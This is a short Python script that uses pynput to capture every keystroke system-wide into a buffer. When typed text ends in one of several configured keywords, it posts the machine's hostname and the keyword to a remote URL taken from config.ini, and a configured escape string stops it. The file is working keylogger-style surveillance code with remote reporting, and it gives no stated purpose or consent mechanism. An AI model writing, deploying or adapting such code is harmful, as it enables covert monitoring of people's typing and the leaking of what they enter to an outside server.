from pynput import keyboard
import sys, socket, requests, json, logging, configparser
config = configparser.ConfigParser()
config.read('config.ini')
FILENAME = config['DEFAULT']['FILENAME']
LOG_DIR = config['DEFAULT']['LOG_DIR']
LOGFILE = config['DEFAULT']['LOGFILE']
ESCAPE_STRING = config['DEFAULT']['ESCAPE_STRING']
FLAGS_config = config['DEFAULT']['FLAGS']
FLAGS = FLAGS_config.split(',')
URL = config['DEFAULT']['URL']
HOSTNAME = socket.gethostname()
logging.basicConfig(filename=(LOG_DIR + LOGFILE), level=(logging.DEBUG), format='%(asctime)s: %(message)s')
file = '1'

def get_key_name(key):
    if isinstance(key, keyboard.KeyCode):
        return key.char
    return str(key)


def on_press(key):
    global file
    key_name = get_key_name(key)
    if key.__class__.__name__ == 'KeyCode':
        file += key_name


def on_release(key):
    global file
    data = file
    if data[-1 * len(ESCAPE_STRING):] == ESCAPE_STRING:
        file = '1'
        logging.info('Escape string caught - Exiting...')
        sys.exit()
    for flag in FLAGS:
        if data[-1 * len(flag):] == flag:
            send_data(flag)
            break


def send_data(flag):
    global file
    logging.info('Keyword ' + flag + ' caught - Sending API request...')
    data = {'hostname':HOSTNAME,  'flag':flag}
    payload = json.dumps(data)
    try:
        res = requests.post(url=URL, json=data)
        if res.text == 'Message received':
            logging.info('API request successfully sent. Clearing buffer...')
        else:
            logging.error('Unexpected response from the server. Clearing buffer...')
    except:
        logging.error('HTTP connection error - ' + URL + ' is not responding')
    else:
        file = '1'


logging.info('Starting capture...')
with keyboard.Listener(on_press=on_press,
  on_release=on_release) as listener:
    listener.join()
